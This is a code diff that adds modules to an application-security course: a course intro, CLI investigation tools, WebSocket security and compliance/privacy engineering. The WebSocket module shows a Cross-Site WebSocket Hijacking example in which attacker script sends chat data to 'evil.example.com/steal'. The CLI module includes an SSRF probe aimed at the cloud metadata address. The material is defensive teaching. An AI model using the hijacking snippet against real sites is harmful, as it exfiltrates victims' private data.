@@ -869,6 +869,106 @@ const curriculum = {
     weeks: "Ongoing"
   }],
   modules: [
+  // ============== INTRO ==============
+  {
+    id: "m_intro",
+    phaseId: "p0",
+    num: "Intro",
+    title: "Start Here — About This Course",
+    objective: "Before you write a single line of secure code, orient yourself: what this course is, who it is for, how far it will take you, and how to get the most out of every module. This page is the map.",
+    body: `## Welcome to Full-Stack AppSec
+
+This course is a practitioner-grade, full-stack application security curriculum built for developers who write real code and want to understand — not just fear — the security layer. The goal is not to make you a pentester, though you will learn to think like one. The goal is to make security a natural dimension of how you build software.
+
+---
+
+### What this course is
+
+**53 modules across 12 phases** (plus Phase 7.5: AI/LLM Security). Every module follows the same pattern: concept → attack demonstration → defense → hands-on lab. You learn a vulnerability by seeing it exploited, then you fix it, then you write the test that would have caught it.
+
+The course uses Node.js and Express as its primary example language because it is the most common full-stack pairing — but Phase 3.5 explicitly maps every pattern to Python, Go, Java, PHP, and Ruby. The security thinking is language-agnostic; only the syntax differs.
+
+---
+
+### Course roadmap
+
+| Phase | Name | What you gain |
+|-------|------|---------------|
+| **0** | Foundations | How computers, the web, databases, and the terminal actually work — viewed through a threat lens |
+| **1** | Web & CLI | HTTP/DNS/TLS deep-dive, CLI investigation toolkit, Git/GitHub security (basics + advanced Actions hardening) |
+| **2** | Browser Security | Same-origin policy, XSS, CSRF, CORS misconfiguration |
+| **3** | Server Security | Node/Express hardening, SQL injection, API security, file uploads, polyglot patterns, business logic flaws, WebSockets |
+| **4** | Offensive Foundations | OWASP Top 10 as a threat model, hands-on web exploitation, PortSwigger lab track |
+| **5** | Pentesting Workflow | Burp Suite and ZAP, repeatable assessment methodology, bug bounty pathway |
+| **6** | Auth & Identity | Password storage, sessions, JWTs, OAuth 2.0/OIDC, authorization models, WebAuthn/passkeys |
+| **7** | Secure SDLC | Shift-left practices, software supply chain security, compliance & privacy engineering |
+| **7.5** | AI / LLM Security | OWASP LLM Top 10, prompt injection, output handling, model supply chain, cost DoS, secure AI-assisted development |
+| **8** | DevSecOps | Secrets management, production hardening, cloud posture (IAM, SSRF, metadata), containers & Kubernetes |
+| **9** | Incident Response | Security logging, detection & alerting, IR playbooks |
+| **10** | Capstone Labs | Four end-to-end projects: secure a real vulnerable app, build auth from scratch, threat-model, CI/CD pipeline |
+
+---
+
+### Who this is for
+
+- **Full-stack or back-end developers** who have shipped at least one web application and want to stop being the weakest link in their team's security posture
+- **Career-changers into AppSec or DevSecOps** who want a structured, hands-on path — not just a reading list
+- **Front-end developers** who want to understand what happens on the server side of the trust boundary
+- **Engineers preparing for security certifications** (BSCP, GWEB, OSWA, eWPT — this course prepares for all four)
+
+**Prerequisite:** You should be comfortable with at least one programming language and have a rough idea of how HTTP requests work (if not, Phase 0 will fill those gaps quickly).
+
+---
+
+### What you will be able to do
+
+By the time you complete this course you will be able to:
+
+- Find and fix every OWASP Top 10 vulnerability in a real codebase
+- Design secure authentication systems: password hashing, sessions, JWTs, OAuth 2.0, passkeys
+- Conduct a professional Burp Suite assessment against a web application
+- Threat-model a full-stack application from scratch
+- Build and run a SAST/DAST/SCA pipeline in GitHub Actions
+- Audit your supply chain and generate a signed SBOM
+- Harden a cloud deployment: IAM least-privilege, secrets management, container security, Kubernetes RBAC
+- Understand, detect, and write an incident-response playbook for a web app breach
+
+The **sidebar skill indicator** tracks your live progress through seven named levels as you check off tracker items — from Foundation Builder through Full-Stack AppSec Champion.
+
+---
+
+### How to use this reader
+
+**Sidebar** — navigate phases and modules. Each phase can be collapsed/expanded. The skill-level card at the bottom of the sidebar updates as you complete tracker items.
+
+**Tracker** — each module has a checklist of concrete "I can do this" items. Check them off as you complete the corresponding lab or concept. The overall progress bar and skill level update automatically.
+
+**Knowledge checks** — short self-assessment questions at the end of each module. Most modules have a \`Show answers\` toggle; use it to verify your understanding, not to skip the thinking.
+
+**Theme toggle** — top-right corner cycles through dark, light, and system theme.
+
+**Pace** — the typical path is 2–4 hours per module for Phase 0–3, 4–6 hours for Phase 4–7, and 6–8 hours for Phase 8–10. Total course: **~200–250 hours** of serious study and lab work. There is no timer — go at the pace that lets you do the labs, not just read them.
+
+---
+
+### Relationship to Cyber Guardians
+
+This course is one half of a two-course path:
+
+- **Full-Stack AppSec (this course)** — deep specialist dive into web application security. 12 phases, real exploit labs, certification-prep level depth.
+- **[Cyber Guardians](../cyber-guardians/cyber_guardians_app.html)** — the breadth-first companion: blue-team / SOC operations, network security, cryptography, forensics, incident response, cloud security, and governance. 30 modules covering the wider landscape that AppSec specialists build on.
+
+**Which to do first?** Many learners do AppSec first because it builds directly on existing dev skills and gives a concrete security foundation before branching out. Others do Cyber Guardians first for the broader context. Either order works — the courses are designed to complement each other, not depend on each other.
+
+---
+
+➡️ **First step:** Your security lab is only as useful as the tools in it. Set up your cross-platform environment now. Continue to **Module 0.0: Environment & Lab Setup**.`,
+    tracker: [
+      "Read the course overview and roadmap; know which phase covers which topic",
+      "Identified at least one certification from the roadmap to work toward",
+      "Bookmarked or noted the relationship between this course and Cyber Guardians"
+    ]
+  },
   // ============== PHASE 0 ==============
   {
     id: "m0-0",
@@ -2352,6 +2452,228 @@ If your repo is public (or your org has GHAS):
       {
         q: "What is the security difference between `pull_request` and `pull_request_target` triggers?",
         a: "`pull_request` from a fork runs in a restricted sandbox: no write permissions, no access to secrets. `pull_request_target` always runs in the context of the *base* repository (with write permissions and secrets) even when triggered by a fork PR. Checking out and running untrusted fork code inside a `pull_request_target` workflow is effectively remote code execution with full repository write access."
+      }
+    ]
+  },
+  {
+    id: "m1-6",
+    phaseId: "p1",
+    num: "1.6",
+    title: "Security Investigation Toolkit — curl, openssl, jq, lsof, awk",
+    objective: "grep and rg got you through basic secret hunting. Now build the rest of the security investigator's toolkit: inspect a live TLS connection with openssl, probe any HTTP endpoint with curl, parse API responses and logs with jq and awk, and see exactly what your processes are doing with lsof and ss. These tools are how security engineers spend their days.",
+    body: `> **The gap Module 1.3 left.** That module made you comfortable in the shell and taught you to hunt secrets in files. This one builds the *network and process investigation* layer — the tools you need when the question is "what is this server doing?" rather than "what is in this file?"
+
+### 🔍 curl — your HTTP Swiss army knife
+
+\`curl\` is what the browser hides from you: every HTTP request, header, redirect, and certificate. Security engineers use it to test endpoints precisely, without browser magic getting in the way.
+
+\`\`\`bash
+# 1. Show response headers (not body) — check security headers
+curl -I https://example.com
+
+# 2. Show both request and response headers (-v = verbose)
+curl -v https://api.example.com/health 2>&1 | head -40
+
+# 3. Send a JSON body (testing an API endpoint)
+curl -X POST https://api.example.com/login \\
+  -H "Content-Type: application/json" \\
+  -d '{"username":"alice","password":"test123"}'
+
+# 4. Send a cookie
+curl -H "Cookie: session=abc123" https://api.example.com/profile
+
+# 5. Follow redirects AND show each hop (useful for SSRF / open-redirect research)
+curl -L --max-redirs 5 -v https://target.example.com/redirect?url=http://169.254.169.254
+
+# 6. Test with a custom Host header (virtual-host probing)
+curl -H "Host: admin.internal" https://target.example.com/
+
+# 7. Bypass TLS verification (for self-signed certs in a local lab ONLY — never in production research)
+curl -k https://localhost:3443/api
+\`\`\`
+
+**What to look for in response headers:**
+\`\`\`
+✓ Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
+✓ Content-Security-Policy: (should be present and restrictive)
+✓ X-Frame-Options: DENY  (or CSP frame-ancestors)
+✓ X-Content-Type-Options: nosniff
+✓ Referrer-Policy: no-referrer
+✗ Server: Apache/2.4.52 (Ubuntu)  — version disclosure
+✗ X-Powered-By: Express           — framework disclosure
+\`\`\`
+
+---
+
+### 🔒 openssl s_client — inspect TLS directly
+
+\`openssl s_client\` connects to a server over TLS and shows you the full handshake: certificate chain, cipher suite, protocol version, and expiry.
+
+\`\`\`bash
+# Inspect a TLS connection end-to-end
+openssl s_client -connect example.com:443 -servername example.com 2>/dev/null | \\
+  openssl x509 -noout -text | grep -E "Subject:|Issuer:|Not (Before|After)"
+
+# Check cipher suite negotiated
+openssl s_client -connect example.com:443 2>&1 | grep -E "Protocol|Cipher"
+
+# Test for old TLS versions (should fail on a properly configured server)
+openssl s_client -connect example.com:443 -tls1   2>&1 | grep "alert\|Cipher"
+openssl s_client -connect example.com:443 -tls1_1 2>&1 | grep "alert\|Cipher"
+
+# Quick cert expiry check (useful in a script)
+openssl s_client -connect example.com:443 2>/dev/null | \\
+  openssl x509 -noout -dates
+\`\`\`
+
+A properly hardened server should: reject TLS 1.0 and 1.1, negotiate TLS 1.2 or 1.3 only, and use a cipher suite without RC4, 3DES, or NULL.
+
+---
+
+### 🔧 jq — parse JSON from the command line
+
+APIs return JSON. Logs increasingly do too. \`jq\` is a filter language for JSON — essential for investigating API responses and parsing structured logs.
+
+\`\`\`bash
+# Install
+brew install jq         # macOS
+sudo apt install jq     # Debian/Ubuntu
+
+# Pretty-print a curl response
+curl -s https://api.example.com/users/1 | jq .
+
+# Extract a specific field
+curl -s https://api.example.com/users | jq '.[].email'
+
+# Filter array: only items where role is "admin"
+curl -s https://api.example.com/users | jq '[.[] | select(.role == "admin")]'
+
+# Investigate a JSON log file — count errors per endpoint
+jq -r '.[] | select(.level == "error") | .path' access-log.json | \\
+  sort | uniq -c | sort -rn | head -20
+
+# Extract all Authorization header values from a JSON access log (spot leaked tokens)
+jq -r '.[] | .headers.authorization // empty' access-log.json | sort -u
+\`\`\`
+
+---
+
+### 📊 awk + sort + uniq — log analysis patterns
+
+Logs are where breaches leave fingerprints. These three commands let you answer "what happened?" from a raw log file without a SIEM.
+
+\`\`\`bash
+# Top 20 IPs hitting your app (detect scanning)
+awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20
+
+# All unique 4xx responses — find brute-force attempts and path probing
+awk '$9 ~ /^4/' access.log | awk '{print $9, $7}' | sort | uniq -c | sort -rn | head -30
+
+# All POST requests to /login — detect credential stuffing
+grep 'POST /login' access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20
+
+# Requests that took > 5 seconds (detect DoS / resource exhaustion)
+awk '{if ($NF > 5000) print $0}' access.log | head -20
+
+# Find all unique User-Agents (malicious bots often have distinctive or missing UAs)
+awk -F'"' '{print $6}' access.log | sort | uniq -c | sort -rn | head -20
+\`\`\`
+
+---
+
+### 🌐 ss and lsof — see what's listening
+
+When you're debugging or auditing a server, you need to know exactly what processes are accepting connections.
+
+\`\`\`bash
+# Show all listening TCP sockets and which process owns them
+ss -tlnp          # Linux
+
+# Same on macOS
+lsof -iTCP -sTCP:LISTEN -n -P
+
+# Check if a specific port is in use before starting a service
+ss -tlnp | grep :8080
+
+# All network connections for a specific process (by name)
+lsof -i -P -n | grep node
+
+# All files (including sockets) opened by PID 1234
+lsof -p 1234 | head -40
+
+# Find which process is using a port (quick version)
+lsof -i :3000
+\`\`\`
+
+Security use: after deploying an app, \`lsof -iTCP -sTCP:LISTEN\` should show only the ports you intended to expose. Anything unexpected — a debug port, a management interface, a stray database binding on 0.0.0.0 instead of 127.0.0.1 — is a finding.
+
+---
+
+### ⚡ tmux — persistent sessions for investigation work
+
+When you're doing a live investigation on a remote server, your SSH connection can drop mid-session. \`tmux\` gives you persistent sessions that survive disconnects.
+
+\`\`\`bash
+# Start a new named session
+tmux new -s investigation
+
+# Detach (session keeps running in background): Ctrl+B then D
+
+# List sessions
+tmux ls
+
+# Re-attach to a session
+tmux attach -t investigation
+
+# Split pane horizontally (run curl in one pane, watch logs in another)
+# Ctrl+B then %  (vertical split)
+# Ctrl+B then "  (horizontal split)
+# Ctrl+B then arrow keys to move between panes
+\`\`\`
+
+---
+
+### 🔗 Putting it together: investigate a live endpoint
+
+\`\`\`bash
+# 1. Check what headers the server exposes
+curl -sI https://target.example.com | grep -Ei "server:|x-powered-by:|strict-transport|content-security"
+
+# 2. Verify TLS version and cipher
+openssl s_client -connect target.example.com:443 2>&1 | grep -E "Protocol|Cipher|Verify"
+
+# 3. Check certificate expiry
+openssl s_client -connect target.example.com:443 2>/dev/null | openssl x509 -noout -enddate
+
+# 4. Test an authenticated endpoint and parse the JSON response
+TOKEN=\$(curl -s -X POST https://target.example.com/auth/login \\
+  -H "Content-Type: application/json" \\
+  -d '{"username":"testuser","password":"testpass"}' | jq -r '.token')
+curl -s -H "Authorization: Bearer \$TOKEN" https://target.example.com/api/profile | jq .
+
+# 5. Look for sensitive data in the response (should return 0 findings)
+curl -s -H "Authorization: Bearer \$TOKEN" https://target.example.com/api/profile | \\
+  jq -r 'to_entries[] | "\\(.key): \\(.value)"' | \\
+  grep -i "password\\|secret\\|key\\|hash\\|salt"
+\`\`\`
+
+➡️ **Next step (Phase 1 complete):** You can navigate, search, and investigate from the terminal; you understand Git's history model and can harden a GitHub Actions pipeline. Now step into the browser's security model — where attacks on your users live. Continue to **Phase 2: Secure JavaScript and Browser Security**.`,
+    tracker: [
+      "Used curl -v to inspect response headers on a live HTTPS endpoint and identified at least one missing security header",
+      "Used openssl s_client to view a certificate chain and check TLS version support",
+      "Installed jq and used it to parse a curl JSON response (extract a specific field)",
+      "Used lsof or ss to list all listening ports on your machine and verified nothing unexpected is exposed",
+      "Wrote at least one awk one-liner to extract information from a log file",
+      "Answered the knowledge check"
+    ],
+    knowledgeCheck: [
+      {
+        q: "You curl a production API and see `Server: Apache/2.4.52 (Ubuntu)` and `X-Powered-By: Express 4.18` in the response headers. What is the security concern and what is the fix?",
+        a: "These headers are version disclosure — they tell an attacker exactly which software versions to look up for known CVEs. The fix is to suppress them: in Express, `app.disable('x-powered-by')` (or use the `helmet` package which does this automatically). For Apache, set `ServerTokens Prod` and `ServerSignature Off` in the config. The `Server` header itself can be removed or set to a generic value."
+      },
+      {
+        q: "You run `lsof -iTCP -sTCP:LISTEN` on a production server and see your database (port 5432) listed as listening on `0.0.0.0` instead of `127.0.0.1`. Why is this a security finding?",
+        a: "`0.0.0.0` means the process accepts connections on all network interfaces — including the server's public IP. The database should only be accessible from the application on the same host (or from specific internal IPs), not from the internet. Fix: in `postgresql.conf`, set `listen_addresses = '127.0.0.1'` (or the specific private IP), then restart Postgres. Verify with a port scan from outside: `nmap -p 5432 <server-ip>` should show the port as filtered/closed."
       }
     ]
   },
@@ -4182,6 +4504,188 @@ When testing any application for business logic flaws:
       {
         q: "Two users simultaneously try to redeem a one-use promo code. The server does SELECT (check uses < 1) then UPDATE (increment uses). Why can both succeed, and what is the fix?",
         a: "Because SELECT and UPDATE are separate operations. Between the check and the update, both threads can read uses=0, both pass the check, and both increment — leaving uses=2 even though it should cap at 1. Fix: use an atomic conditional UPDATE (`UPDATE coupons SET uses=uses+1 WHERE code=? AND uses<1`) and check rows-affected; if 0, the code was already used. Alternatively, SELECT FOR UPDATE within a transaction locks the row until the transaction commits, preventing the interleave."
+      }
+    ]
+  },
+  {
+    id: "m3_7",
+    phaseId: "p3",
+    num: "3.7",
+    title: "WebSockets & Real-Time Application Security",
+    objective: "WebSockets power chat apps, live dashboards, collaborative editors, and game state — any feature where the server pushes updates without polling. The upgrade from HTTP to a persistent socket changes the trust model: there is no SOP enforcement, authentication is once-at-upgrade not per-message, and a single open connection can be hijacked by an attacker on the same page. Know the attack surface before you ship the feature.",
+    body: `> **Why this is its own module.** WebSockets look like a simple HTTP upgrade, but they break several assumptions that REST API security is built on. There is no same-origin policy enforcement at the WebSocket level. The browser sends cookies during the upgrade but not per-message. There is no built-in CSRF protection. And because the connection is long-lived, a single authentication bypass grants persistent access.
+
+### 🎯 How WebSockets work — the security-relevant parts
+
+\`\`\`
+Client → Server:  GET /chat HTTP/1.1
+                  Upgrade: websocket
+                  Connection: Upgrade
+                  Origin: https://app.example.com
+                  Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+                  Cookie: session=abc123         ← browser sends cookies automatically
+
+Server → Client:  HTTP/1.1 101 Switching Protocols
+                  Upgrade: websocket
+                  Connection: Upgrade
+                  Sec-WebSocket-Accept: s3pPL...  ← derived from Key, not secret
+\`\`\`
+
+After the handshake the connection is a raw TCP stream with no HTTP semantics. The browser sends the session cookie in the upgrade request — **but not in subsequent messages** — which means the only moment to check the session is during the upgrade handshake.
+
+**wss:// vs ws://** — exactly like HTTPS vs HTTP. \`ws://\` is plaintext: every message is visible on the wire. Always use \`wss://\` in production. Most browsers block \`ws://\` connections from HTTPS origins (mixed content), but this is not a security guarantee — always enforce at the server.
+
+### ⚔️ Cross-Site WebSocket Hijacking (CSWSH)
+
+CSWSH is the WebSocket equivalent of CSRF. Because the browser sends cookies during the WebSocket upgrade, a malicious page on a different origin can initiate a WebSocket connection to *your server* and your server might accept it — because it sees a valid session cookie.
+
+\`\`\`javascript
+// Attacker's page on evil.example.com:
+const ws = new WebSocket("wss://app.example.com/chat");
+// Browser sends the victim's session cookie in the upgrade request.
+// If the server only checks the cookie and not the Origin, it accepts.
+ws.onmessage = (e) => {
+  fetch("https://evil.example.com/steal?d=" + encodeURIComponent(e.data));
+};
+ws.onopen = () => ws.send(JSON.stringify({ action: "getHistory" }));
+\`\`\`
+
+The server thinks it's talking to the real user. The attacker reads the entire chat history.
+
+### 🛡️ Defense: four layers
+
+**1. Validate the Origin header on the server during upgrade**
+
+\`\`\`javascript
+// Node.js + ws library example
+const WebSocket = require("ws");
+const wss = new WebSocket.Server({ port: 8080 });
+
+const ALLOWED_ORIGINS = new Set(["https://app.example.com"]);
+
+wss.on("connection", (ws, req) => {
+  const origin = req.headers.origin;
+  if (!ALLOWED_ORIGINS.has(origin)) {
+    ws.close(1008, "Invalid origin");
+    return;
+  }
+  // ... handle connection
+});
+\`\`\`
+
+Note: the \`Origin\` header *can* be spoofed by non-browser clients (curl, scripts). If you need stronger assurance for sensitive operations, use a CSRF token in the upgrade URL or as the first message.
+
+**2. Require authentication before meaningful messages**
+
+Don't rely solely on the cookie being present. Extract and validate the session *during the upgrade handshake*, and store the authenticated user ID on the connection object:
+
+\`\`\`javascript
+wss.on("connection", async (ws, req) => {
+  const session = await validateSession(req.headers.cookie);
+  if (!session) {
+    ws.close(1008, "Unauthenticated");
+    return;
+  }
+  ws.userId = session.userId;    // store on the socket — recheck per action if needed
+});
+\`\`\`
+
+**3. Validate every message — WebSockets are a new injection surface**
+
+Each message is untrusted user input. If you parse JSON and use values to look up database records, check for injection exactly as you would an HTTP request body:
+
+\`\`\`javascript
+ws.on("message", (raw) => {
+  let msg;
+  try { msg = JSON.parse(raw); } catch { ws.close(1007, "Invalid JSON"); return; }
+
+  // Validate structure and types
+  if (typeof msg.roomId !== "string" || !/^[a-z0-9-]+\$/.test(msg.roomId)) {
+    ws.send(JSON.stringify({ error: "Invalid roomId" }));
+    return;
+  }
+  // Use parameterised query — msg.roomId is still untrusted input
+  const room = await db.query("SELECT * FROM rooms WHERE id = \$1", [msg.roomId]);
+});
+\`\`\`
+
+**4. Rate-limit connections and messages**
+
+A single WebSocket connection can send thousands of messages per second. Without rate limiting, this is a DoS primitive:
+
+\`\`\`javascript
+// Simple token-bucket rate limiter per connection
+const RATE_LIMIT = 20; // max messages per second per connection
+const connections = new Map();
+
+wss.on("connection", (ws) => {
+  connections.set(ws, { count: 0 });
+
+  const interval = setInterval(() => {
+    const state = connections.get(ws);
+    if (state) state.count = 0;
+  }, 1000);
+
+  ws.on("message", (msg) => {
+    const state = connections.get(ws);
+    if (state.count++ > RATE_LIMIT) {
+      ws.close(1008, "Rate limit exceeded");
+      return;
+    }
+    // ... handle message
+  });
+
+  ws.on("close", () => {
+    clearInterval(interval);
+    connections.delete(ws);
+  });
+});
+\`\`\`
+
+### 🔍 Testing WebSockets with Burp Suite
+
+Burp Suite intercepts WebSocket traffic transparently:
+- Go to **Proxy → WebSockets history** to see all WebSocket messages
+- Right-click any message → **Send to Repeater** to replay and modify it
+- The **Intercept** tab can pause and modify messages in real time
+
+For CSWSH testing, use the [PortSwigger WebSocket Security labs](https://portswigger.net/web-security/websockets).
+
+For CLI testing, \`wscat\` connects to a WebSocket endpoint:
+\`\`\`bash
+npm install -g wscat
+wscat -c wss://app.example.com/chat --header "Cookie: session=abc123"
+\`\`\`
+
+### Security checklist for WebSocket features
+
+\`\`\`
+□ Using wss:// (not ws://) in all environments
+□ Validating the Origin header during the upgrade handshake
+□ Authenticating the user during the upgrade (not just trusting the cookie passively)
+□ Validating and sanitising every incoming message (type, length, content)
+□ Rate-limiting both connection count and message rate per connection
+□ Authorising per-action (user can only subscribe to their own rooms/events)
+□ Closing connections on auth failure immediately (not just ignoring bad messages)
+\`\`\`
+
+➡️ **Next step (Phase 3 complete):** Server secured, API locked down, uploads hardened, business logic defended, WebSocket surface controlled. Now zoom out to the industry-standard map of all major risk categories — and practice exploiting them. Continue to **Phase 4: OWASP Top 10 and Web Exploitation Labs**.`,
+    tracker: [
+      "Can explain why the Same-Origin Policy does not automatically protect WebSocket connections",
+      "Can explain the CSWSH attack and name the server-side fix (Origin header validation)",
+      "Has written a WebSocket server that validates Origin and authenticates the user during the upgrade",
+      "Can intercept and replay a WebSocket message in Burp Suite (or describe the steps)",
+      "Knows the four defense layers: Origin validation, upgrade auth, message validation, rate limiting",
+      "Answered the knowledge check"
+    ],
+    knowledgeCheck: [
+      {
+        q: "A developer says 'our WebSocket endpoint is safe because users must log in and the session cookie is sent automatically.' What attack does this not prevent, and what additional check is needed?",
+        a: "This does not prevent Cross-Site WebSocket Hijacking (CSWSH). An attacker on evil.example.com can open a WebSocket connection to your server — the browser will automatically attach the victim's session cookie to the upgrade request. If the server only checks that the cookie is valid (and not *where the connection originated*), the attacker gets an authenticated connection. The additional check: validate the `Origin` header during the upgrade handshake and reject connections from origins not on your allow-list."
+      },
+      {
+        q: "Why must WebSocket messages be validated server-side even if the client is your own trusted front-end app?",
+        a: "Because the client is under the user's control. Anyone with the WebSocket URL and a session cookie can send arbitrary messages — they don't need your front-end app at all (wscat, Burp Repeater, or a script can connect directly). Trusting the structure or content of WebSocket messages because 'our UI only sends valid ones' is the same mistake as trusting HTTP request body fields from your own forms. All server-side validation rules apply: type-check, length-check, sanitise, parameterise database queries."
       }
     ]
   },
@@ -6916,6 +7420,182 @@ In 2017 Equifax disclosed a breach of 147 million records. Root cause: an unpatc
 
 ➡️ **Next step (Phase 7 complete):** You can build security into the conveyor belt — gate insecure code at the PR, defend the code you didn't write, and inventory everything you ship. If your app talks to an LLM, the build pipeline isn't enough: you've added a brand-new trust boundary that classic scanners don't understand. Continue to **Phase 7.5: AI / LLM Application Security**. (If you ship no LLM features, you may skip 7.5 and go straight to **Phase 8: Cloud, Deployment, and Production Security**.)`,
     tracker: ["Can explain that a modern app ships far more (transitive) code than it writes, inside one trust boundary", "Can define typosquatting, dependency confusion, maintainer takeover, malicious postinstall, and protestware", "Can explain the lockfile + integrity hash, npm ci vs npm install, and pinning-with-cooldown", "Generated a CycloneDX SBOM and inspected lockfile integrity hashes on the local lab", "Demoed dependency-confusion resolution and the scope-binding fix in .npmrc", "Read the hardened .npmrc and renovate.json and the Equifax 2017 case study", "Answered the knowledge check"]
+  },
+  {
+    id: "m7_3",
+    phaseId: "p7",
+    num: "7.3",
+    title: "Compliance & Privacy Engineering for Developers",
+    objective: "GDPR, PCI DSS, SOC 2, and HIPAA are not just lawyer documents — they impose specific, concrete technical controls on the systems you build. Developers who understand what the regulations actually require ship the right controls the first time instead of retrofitting them after an audit. This module translates the frameworks into engineering actions.",
+    body: `> **Why developers need to own this.** Every breach investigation finds the same pattern: the compliance team produced a 200-page policy; the engineering team was never told which specific controls to implement. If you're a full-stack developer, you implement auth, you design the database schema, you write the logging code — the technical substance of compliance is yours to build.
+
+### 🎯 GDPR — what full-stack developers actually need to implement
+
+GDPR (General Data Protection Regulation) applies to any system that processes personal data of EU residents, regardless of where your company is located.
+
+**Six lawful bases for processing.** Before you collect data, you need a lawful basis. For most product features: *legitimate interest* or *contract* (the user's usage of your service). For marketing and analytics: *consent* — explicit, specific, and revocable. If you're building a consent flow, it must be as easy to withdraw as to give.
+
+**Data subject rights** — your API must support these:
+
+| Right | What your system must do |
+|-------|-------------------------|
+| **Access** | Return all personal data you hold about a user on request (data export / DSAR) |
+| **Rectification** | Update incorrect data on request |
+| **Erasure ("right to be forgotten")** | Delete a user's data on request — including backups, logs, and analytics |
+| **Data portability** | Export data in a machine-readable format (JSON or CSV) |
+| **Object to processing** | Honour opt-out of legitimate-interest processing (e.g., stop using their data for profiling) |
+
+**Breach notification.** If you suffer a data breach: notify your supervisory authority **within 72 hours** of becoming aware. Notify affected individuals "without undue delay" if there is high risk to them. This means your incident response playbook (Phase 9) must include a legal-notification step.
+
+**Privacy by design — engineering patterns:**
+\`\`\`javascript
+// Data minimisation: collect only what you need
+// ❌ Collect everything, decide later
+const user = { name, email, phone, dob, address, ip, userAgent, fingerprint };
+
+// ✅ Collect only what your feature requires
+const user = { name, email };   // add fields only when a specific feature needs them
+
+// Pseudonymisation: decouple analytics from identity
+// Store a hashed user ID in analytics events, not the real user ID
+const analyticsId = crypto.createHash("sha256").update(userId + ANALYTICS_SALT).digest("hex");
+
+// Retention: don't keep data longer than needed
+// Set up a cron job / TTL policy to delete old data
+// "We might need it someday" is not a lawful basis for retention
+\`\`\`
+
+**Key technical controls:**
+- Encrypt personal data at rest (database encryption, field-level encryption for especially sensitive data)
+- Encrypt in transit (TLS everywhere — covered in Phase 1)
+- Log access to personal data (who queried what, when — for accountability)
+- Never store sensitive personal data in logs (EU court ruling: IP addresses are personal data)
+- Document your data flows in a Record of Processing Activities (ROPA)
+
+---
+
+### 💳 PCI DSS — what developers need to know about card data
+
+PCI DSS (Payment Card Industry Data Security Standard) applies to any system that stores, processes, or transmits cardholder data.
+
+**The single most important rule: never touch raw card data.**
+
+The goal is to minimise your PCI scope entirely:
+
+\`\`\`
+❌ Bad: Your server receives the card number and processes it
+✅ Good: Use Stripe.js / Braintree.js / similar — the card number goes directly from the
+         browser to the payment processor. Your server never sees it. It receives a token.
+\`\`\`
+
+Using a payment processor's client-side JavaScript library (Stripe Elements, Braintree Drop-in) means your servers are out of scope for the strictest PCI requirements (SAQ A vs SAQ D — SAQ A is a 1-page self-assessment; SAQ D is a ~500-control audit).
+
+**What developers must still implement:**
+- Never log card numbers (not even partial, unless you log only the last 4 digits in a controlled way)
+- Never store card numbers in your own database — always use the processor's token
+- Ensure your redirect flow uses HTTPS exclusively (no HTTP downgrade)
+- Apply strong access controls to any system that touches cardholder data environments (CDE)
+- Use a WAF in front of payment pages (PCI DSS 6.4)
+
+---
+
+### 🏢 SOC 2 — what it means for your engineering team
+
+SOC 2 Type II is an audit framework (not a law) that assesses whether your system reliably provides five Trust Service Criteria over a period of time (usually 6–12 months). It's commonly required by enterprise customers.
+
+The five criteria and their engineering implications:
+
+| Criterion | What engineering implements |
+|-----------|---------------------------|
+| **Security** | Access controls, MFA, vulnerability management, pen testing, incident response |
+| **Availability** | SLAs, redundancy, disaster recovery, monitoring and alerting |
+| **Processing Integrity** | Correct, complete, timely processing — audit trails, error rates |
+| **Confidentiality** | Encryption of confidential data at rest and in transit, NDA-governed access |
+| **Privacy** | GDPR/CCPA controls — consent, data subject rights, retention policies |
+
+**Engineering actions that commonly appear on SOC 2 audit evidence lists:**
+\`\`\`
+□ All production access requires MFA
+□ Engineers use separate accounts for production vs development
+□ All infrastructure changes go through code review (no manual console changes)
+□ All access to production data is logged and reviewed
+□ Dependency vulnerability scanning in CI (npm audit, pip-audit, Trivy)
+□ Penetration test conducted annually by a qualified third party
+□ Incident response plan documented and tested (tabletop exercise)
+□ Employee security training completed (onboarding + annual)
+□ Background checks for employees with production access
+□ Offboarding checklist removes all access within 24 hours of departure
+\`\`\`
+
+---
+
+### 🏥 HIPAA basics — if you build health applications
+
+HIPAA (Health Insurance Portability and Accountability Act) applies to *covered entities* (hospitals, insurers) and their *business associates* (developers building apps that handle PHI — Protected Health Information).
+
+PHI is: any health information combined with an identifier (name, SSN, account number, device ID, geographic data, dates of service, etc.). If your app stores diagnosis codes, medication history, lab results, or appointment records linked to a specific person — you are handling PHI.
+
+**Key technical safeguards:**
+- Encryption at rest and in transit (both required, unlike GDPR where it's "appropriate measures")
+- Unique user IDs and automatic session logout (no shared accounts)
+- Audit logs of all PHI access (who, what, when) — retained for 6 years
+- Emergency access procedures and backup plans
+- BAA (Business Associate Agreement) required before handling PHI with any vendor (AWS, GCP, Stripe, Twilio, etc.)
+
+---
+
+### ✅ Privacy-by-design quick wins — implement these now
+
+Regardless of which framework applies to your app, these patterns cost little and satisfy most requirements:
+
+\`\`\`javascript
+// 1. Hash/redact PII in logs
+const logSafeUser = (user) => ({
+  id: user.id,
+  emailHash: crypto.createHash("sha256").update(user.email).digest("hex").slice(0, 8),
+  // never log: full email, phone, address, SSN, card number
+});
+logger.info("User logged in", logSafeUser(user));
+
+// 2. Enforce data retention with a TTL policy (example: auto-delete inactive users after 2 years)
+// Run monthly in a background job:
+await db.query(
+  "DELETE FROM users WHERE last_active < NOW() - INTERVAL '2 years' AND marketing_consent = false"
+);
+
+// 3. Data export endpoint (right to access / portability)
+app.get("/api/me/export", authenticate, async (req, res) => {
+  const data = await getUserData(req.user.id);   // pull from all tables
+  res.setHeader("Content-Disposition", "attachment; filename=my-data.json");
+  res.json(data);
+});
+
+// 4. Account deletion endpoint (right to erasure)
+app.delete("/api/me", authenticate, async (req, res) => {
+  await deleteUser(req.user.id);  // cascade through analytics, logs, backups
+  res.json({ message: "Your data has been deleted." });
+});
+\`\`\`
+
+➡️ **Next step:** The pipeline is hardened, the supply chain is inventoried, and compliance is built in. If your app uses AI features, those introduce a brand-new trust boundary next. Continue to **Phase 7.5: AI / LLM Application Security**. (If you ship no LLM features, go straight to **Phase 8: Cloud, Deployment, and Production Security**.)`,
+    tracker: [
+      "Can name the six GDPR data subject rights and describe what each requires your system to implement",
+      "Understands why PCI DSS scope reduction (never touching raw card data) is the most important PCI control for developers",
